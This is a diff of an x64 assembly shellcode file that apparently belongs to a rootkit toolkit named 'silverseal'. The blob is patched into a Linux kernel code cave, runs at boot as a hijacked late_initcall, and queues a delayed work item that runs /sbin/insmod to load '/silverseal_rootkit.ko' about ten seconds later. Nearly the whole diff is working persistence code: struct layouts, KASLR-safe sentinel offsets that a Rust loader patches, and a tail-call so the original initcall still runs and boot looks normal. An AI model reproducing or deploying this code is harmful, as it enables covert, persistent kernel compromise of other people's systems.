@@ -1,47 +1,44 @@
 ; lkm_loader.asm
 ; Position-independent x64 shellcode executed as a Linux kernel late_initcall.
 ;
-; Instead of calling __request_module directly (which would fail because
-; userspace is not yet running at late_initcall time), this blob schedules a
-; kernel work item and returns immediately. The work item sleeps for 10 seconds
-; to let userspace start, then calls __request_module to load the rootkit LKM.
+; Initialises a struct delayed_work and calls queue_delayed_work so the kernel
+; scheduler fires the work function (lkm_worker, in a .text cave) after a
+; 10-second delay. By that time userspace is running and call_usermodehelper
+; can spawn insmod. Returns immediately after queuing so boot proceeds normally.
 ;
-; All kernel addresses are encoded as PC-relative rel32 offsets — no absolute
-; pointers — making this blob KASLR-safe. The Rust loader scans for 4-byte
-; sentinel values and patches them with the correct relative offsets before
-; writing the blob into the kernel .data code cave.
+; All kernel addresses are encoded as PC-relative rel32/disp32 offsets — no
+; absolute pointers — making this blob KASLR-safe. The Rust loader scans for
+; 4-byte sentinel values and patches them with the correct relative offsets
+; before writing the blob into the kernel .data code cave.
 ;
 ; Assemble (flat binary):
 ;   nasm -f bin -o lkm_loader.bin lkm_loader.asm
 ;
 ; Blob layout (offsets from blob start):
-;   [0]         lkm_loader (≤128 bytes) — late_initcall entry; initialises
-;                       work_struct with work.func = &lkm_worker_resume (.text),
-;                       calls schedule_work, tail-calls original initcall.
-;   [128]       lkm_worker — work function: msleep(10000), __request_module.
-;               (lkm_worker_resume in .text re-enables execution of this page
-;                before jumping here, so this code runs from an executable page.)
-;   [lkm_worker + sizeof(lkm_worker)]  work_struct_data — 32-byte struct
-;   [work_struct_data + 32]            path_buffer — 256-byte module path
+;   [0]                lkm_loader code (≤128 bytes)
+;   [code_end]         delayed_work_data — 96-byte struct delayed_work, zeroed;
+;                        populated at runtime by lkm_loader before the call.
+;   [+96]              insmod_path — "/sbin/insmod\0" (13 bytes)
+;   [+109]             argv_data — 24 bytes (3 qwords); pre-built by Rust:
+;                        [0] = &insmod_path virt, [8] = &path_buffer virt, [16] = 0
+;   [+133]             path_buffer — "/silverseal_rootkit.ko\0", padded to 256 bytes
 ;
 ; Sentinels (patched as i32 PC-relative offsets by Rust before writing blob):
-;   WORKER_RESUME_SENTINEL       0x11EEDDFF  disp32 in lea rax,[rip+d]
-;                                             → lkm_worker_resume_virt (.text)
-;   SCHEDULE_WORK_REL_SENTINEL   0xAABBCCDD  rel32 in call schedule_work
-;   ORIGINAL_FN_REL_SENTINEL     0x12345678  rel32 in jmp  original_initcall
-;   MSLEEP_REL_SENTINEL          0x11AABBCC  rel32 in call msleep
-;   REQUEST_MODULE_REL_SENTINEL  0xDDEEFF00  rel32 in call __request_module
+;   LKM_WORKER_CAVE_SENTINEL    0x11EEDDFF  disp32 in lea rax,[rip+d]
+;                                             → lkm_worker_cave_virt (.text)
+;   TIMER_FN_DISP_SENTINEL      0xBBCCDDEE  disp32 in lea rax,[rip+d]
+;                                             → delayed_work_timer_fn (.text)
+;   SYSTEM_WQ_DISP_SENTINEL     0xCCDDEEFF  disp32 in mov rdi,[rip+d]
+;                                             → system_wq kernel global (load its value)
+;   QUEUE_DELAYED_WORK_REL_SENTINEL 0x33445566  rel32 in call queue_delayed_work
+;   ORIGINAL_FN_REL_SENTINEL    0x12345678  rel32 in jmp  original_initcall
 ;
-; RIP-relative LEA instructions for work_struct_data and path_buffer are
-; computed by NASM automatically — no sentinels needed for them.
+; RIP-relative LEA for delayed_work_data is computed by NASM automatically.
 ;
 ; Debug: emits on COM1 (0x3F8):
 ;   'S' — lkm_loader entered
-;   'W' — schedule_work returned (work queued)
+;   'W' — queue_delayed_work returned (work queued, 10 s delay started)
 ;   'J' — about to tail-call original initcall
-;   'D' — lkm_worker entered (delay starting)
-;   'M' — msleep returned (about to call __request_module)
-;   'L' — __request_module returned (module load requested)
 
 BITS 64
 default rel
@@ -64,35 +61,63 @@ lkm_loader:
 
     SERIAL_CHAR 'S'                     ; checkpoint: shellcode entered
 
-    ; ── Initialise struct work_struct at runtime ──────────────────────────────
+    ; ── Initialise struct delayed_work at runtime ─────────────────────────────
     ;
-    ; struct work_struct layout (32 bytes):
-    ;   [+0]  atomic_long_t data   (8 bytes) — 0 = PENDING_BIT clear, fresh item
-    ;   [+8]  list_head entry.next (8 bytes) — must point to &entry for list_empty
-    ;   [+16] list_head entry.prev (8 bytes) — same
-    ;   [+24] work_func_t func     (8 bytes) — pointer to lkm_worker
+    ; struct delayed_work layout (88 bytes, we allocate 96 for safety):
+    ;   [+0]  work_struct:
+    ;     [+0]   atomic_long_t data   (8) — 0 = PENDING_BIT clear
+    ;     [+8]   list_head entry.next (8) — &entry (self-referential → list_empty)
+    ;     [+16]  list_head entry.prev (8) — &entry
+    ;     [+24]  work_func_t func     (8) — &lkm_worker (.text cave)
+    ;   [+32] timer_list:
+    ;     [+32]  hlist_node.next  (8) — 0 (timer not pending)
+    ;     [+40]  hlist_node.pprev (8) — 0 (timer not pending)
+    ;     [+48]  expires          (8) — 0 (set by queue_delayed_work internally)
+    ;     [+56]  function         (8) — &delayed_work_timer_fn (REQUIRED)
+    ;     [+64]  flags            (4) — TIMER_IRQSAFE = 0x00200000
+    ;   [+72] wq                  (8) — 0 (set by queue_delayed_work internally)
+    ;   [+80] cpu                 (4) — 0 (set by queue_delayed_work internally)
     ;
-    ; rdi = &work_struct (RIP-relative LEA; NASM computes disp32 automatically)
-    lea     rdi, [work_struct_data]
+    ; rdi = &delayed_work (RIP-relative LEA; NASM computes disp32 automatically)
+    lea     rdi, [delayed_work_data]
     mov     qword [rdi], 0              ; work.data = 0
+
     lea     rax, [rdi + 8]             ; rax = &work.entry
-    mov     [rdi + 8],  rax            ; entry.next = &entry  (self → list_empty == true)
+    mov     [rdi + 8],  rax            ; entry.next = &entry  (list_empty == true)
     mov     [rdi + 16], rax            ; entry.prev = &entry
-    ; work.func = &lkm_worker_resume (in .text — permanently executable).
-    ; After kernel_init() calls mark_readonly(), the .data cave becomes NX again.
-    ; lkm_worker_resume re-calls set_memory_x before jumping to lkm_worker here.
-    ; disp32 patched by Rust: lkm_worker_resume_virt - (loader_cave_virt + off + 4)
+
+    ; work.func = &lkm_worker (in .text — permanently executable).
+    ; .text caves are never made NX; no set_memory_x trick needed.
+    ; disp32 patched by Rust: lkm_worker_cave_virt - (loader_cave_virt + off + 4)
     db      0x48, 0x8D, 0x05           ; REX.W LEA rax, [rip + disp32]
-    dd      0x11EEDDFF                  ; WORKER_RESUME_SENTINEL
-    mov     [rdi + 24], rax            ; work.func = &lkm_worker_resume
+    dd      0x11EEDDFF                  ; LKM_WORKER_CAVE_SENTINEL
+    mov     [rdi + 24], rax            ; work.func = &lkm_worker
 
-    ; ── schedule_work(&work_struct) ───────────────────────────────────────────
-    ; rdi already = &work_struct; no other args needed.
-    ; rel32 patched by Rust: schedule_work_virt - (loader_cave_virt + off + 4)
+    ; timer.function = &delayed_work_timer_fn (required — called when timer fires
+    ; to re-queue the work item into the workqueue; NULL here = kernel panic).
+    ; disp32 patched by Rust: dtimerfn_virt - (loader_cave_virt + off + 4)
+    db      0x48, 0x8D, 0x05           ; REX.W LEA rax, [rip + disp32]
+    dd      0xBBCCDDEE                  ; TIMER_FN_DISP_SENTINEL
+    mov     [rdi + 56], rax            ; timer.function = &delayed_work_timer_fn
+
+    ; timer.flags = TIMER_IRQSAFE (0x00200000) — required for workqueue timers.
+    mov     dword [rdi + 64], 0x00200000
+
+    ; ── queue_delayed_work(system_wq, &dwork, 2500) ───────────────────────────
+    ; arg1 rdi = *system_wq  (dereference the kernel global to get the wq pointer)
+    ; disp32 patched by Rust: system_wq_virt - (loader_cave_virt + off + 4)
+    ; This MOV loads the 8-byte pointer stored at system_wq, not its address.
+    db      0x48, 0x8B, 0x3D           ; REX.W MOV rdi, [rip + disp32]
+    dd      0xCCDDEEFF                  ; SYSTEM_WQ_DISP_SENTINEL
+    ; arg2 rsi = &delayed_work_data
+    lea     rsi, [delayed_work_data]
+    ; arg3 rdx = 2500 jiffies  (10 * HZ; assumes HZ=250, the Ubuntu/Debian default)
+    mov     edx, 2500
+    ; rel32 patched by Rust: queue_delayed_work_virt - (loader_cave_virt + off + 4)
     db      0xE8                        ; CALL rel32
-    dd      0xAABBCCDD                  ; SCHEDULE_WORK_REL_SENTINEL
+    dd      0x33445566                  ; QUEUE_DELAYED_WORK_REL_SENTINEL
 
-    SERIAL_CHAR 'W'                     ; checkpoint: work queued successfully
+    SERIAL_CHAR 'W'                     ; checkpoint: work queued, delay started
 
     pop     rbp
 
@@ -103,52 +128,27 @@ lkm_loader:
     db      0xE9                        ; JMP rel32
     dd      0x12345678                  ; ORIGINAL_FN_REL_SENTINEL
 
-; ── lkm_worker: kernel work function ────────────────────────────────────────
-; Called via lkm_worker_resume (.text trampoline) which re-enables execution
-; of this .data page before jumping here.  Sleeps 10 s then loads the module.
-;
-; Prototype (work_func_t):  void lkm_worker(struct work_struct *work)
-; On entry: rsp % 16 == 8  (tail-called from lkm_worker_resume)
-;
-; Aligned to offset 128 from the blob start so Rust can compute its virtual
-; address as: lkm_worker_virt = loader_cave_virt + LKM_WORKER_IN_LOADER_OFFSET
-; (where LKM_WORKER_IN_LOADER_OFFSET = 128).
-align   128, db 0
+; ── Data section ─────────────────────────────────────────────────────────────
+; No lkm_worker code here — the work function lives in a .text cave (lkm_worker.asm).
 
-lkm_worker:
-    push    rbp                         ; align rsp
+; struct delayed_work: 96 bytes, zeroed — populated at runtime above.
+delayed_work_data:
+    times   96 db 0
 
-    SERIAL_CHAR 'D'                     ; checkpoint: delay starting
+; Path for argv[0] passed to call_usermodehelper.
+insmod_path:
+    db      "/sbin/insmod", 0           ; 13 bytes
 
-    ; msleep(10000) — block this workqueue thread for 10 seconds.
-    ; This thread is not the initcall thread, so the boot continues normally.
-    ; rel32 patched by Rust: msleep_virt - (loader_cave_virt + off + 4)
-    mov     edi, 10000                  ; arg1: milliseconds
-    db      0xE8                        ; CALL rel32
-    dd      0x11AABBCC                  ; MSLEEP_REL_SENTINEL
+; argv array (3 qwords).
+; Pre-built by Rust before the blob is written:
+;   argv_data[0] = insmod_path_virt   (&insmod_path above, runtime virtual address)
+;   argv_data[8] = path_buffer_virt   (&path_buffer below, runtime virtual address)
+;   argv_data[16] = 0                 (NULL terminator)
+; lkm_worker reads this array at work-item execution time (10 s after boot).
+argv_data:
+    times   24 db 0
 
-    SERIAL_CHAR 'M'                     ; checkpoint: calling __request_module
-
-    ; __request_module(true, "/silverseal_rootkit.ko")
-    ; rel32 patched by Rust: request_module_virt - (loader_cave_virt + off + 4)
-    mov     edi, 1                      ; arg1: wait = true
-    lea     rsi, [path_buffer]          ; arg2: fmt = path (RIP-relative, NASM-computed)
-    xor     eax, eax                    ; al = 0 (variadic: no vector register args)
-    db      0xE8                        ; CALL rel32
-    dd      0xDDEEFF00                  ; REQUEST_MODULE_REL_SENTINEL
-                                        ; return value discarded (void work function)
-
-    SERIAL_CHAR 'L'                     ; checkpoint: module load requested
-
-    pop     rbp
-    xor     eax, eax                    ; return 0 (rax ignored; work_func_t is void)
-    ret
-
-; ── struct work_struct: 32 bytes, zeroed — patched at runtime ────────────────
-work_struct_data:
-    times   32 db 0
-
-; ── Path buffer: 256 bytes total ─────────────────────────────────────────────
+; Path for argv[1]: the rootkit module to load.
 path_buffer:
     db      "/silverseal_rootkit.ko", 0
     times   (256 - ($ - path_buffer)) db 0
